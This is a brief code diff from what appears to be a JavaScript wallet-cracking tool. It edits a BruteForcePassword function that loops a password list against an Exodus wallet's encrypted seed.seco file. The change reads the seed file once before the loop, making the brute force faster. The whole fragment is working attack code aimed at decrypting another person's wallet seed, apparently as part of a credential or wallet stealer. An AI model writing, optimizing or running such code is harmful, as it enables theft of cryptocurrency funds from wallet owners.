@@ -69,11 +69,11 @@ function BruteForcePassword(passwords) {
 
         let tried_passwords = 0
         var passwords_l = [...new Set(passwords)];
-        var path = fs.readFileSync(exodusInfo.path);
+        var seedbuffer = fs.readFileSync(exodusInfo.path);
         for (const p of passwords_l) {
             if (p.length > 4) {
                 try {
-                    seco.decryptData(fs.readFileSync(ExodusPath + "\\seed.seco"), p)
+                    seco.decryptData(seedbuffer, p)
                     var end = process.hrtime(start)
 
                     return {
